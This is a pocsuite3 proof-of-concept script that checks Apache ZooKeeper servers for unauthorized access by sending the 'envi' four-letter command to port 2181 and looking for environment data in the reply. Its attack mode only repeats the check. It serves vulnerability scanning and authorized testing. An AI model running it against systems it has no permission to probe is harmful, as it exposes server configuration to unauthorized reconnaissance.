#!/usr/bin/python
# -*- coding: utf-8 -*-
from pocsuite3.api import register_poc
from pocsuite3.api import Output
from pocsuite3.api import POCBase
from pocsuite3.api import logger
from urllib.parse import urlparse
import socket
from collections import OrderedDict
from pocsuite3.api import OptString

class Zookeeper(POCBase):
    vulID = ''
    version = '1.0'
    author = ['big04dream']
    vulDate = '2019-11-05'
    createDate = '2019-11-05'
    updateDate = '2019-11-05'
    references = ['']
    name = 'Zookeeper Unauthorized access'
    appPowerLink = 'https://zookeeper.apache.org/'
    appName = 'Zookeeper'
    appVersion = 'all'
    vulType = 'Unauthorized access'
    desc = '''
    Zookeeper Unauthorized access
    '''

    def _options(self):
        o = OrderedDict()
        o['port'] = OptString('', description='这个poc需要输入端口', require=False)
        return o

    def _verify(self):
        result = {}
        try:
            socket.setdefaulttimeout(10)
            host = urlparse(self.url).hostname
            port = self.get_option('port')
            if port:
                port = int(port)
            else:
                port = 2181
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, port))
            payload = b'envi'
            s.send(payload)
            data = s.recv(1024)
            s.close()
            if b'Environment' in data:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = host
                result['VerifyInfo']['Payload'] = payload
        except Exception as e:
            logger.info(e)
        return self.parse_output(result)

    def _attack(self):
        return self._verify()

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('not vulnerability')
        return output

register_poc(Zookeeper)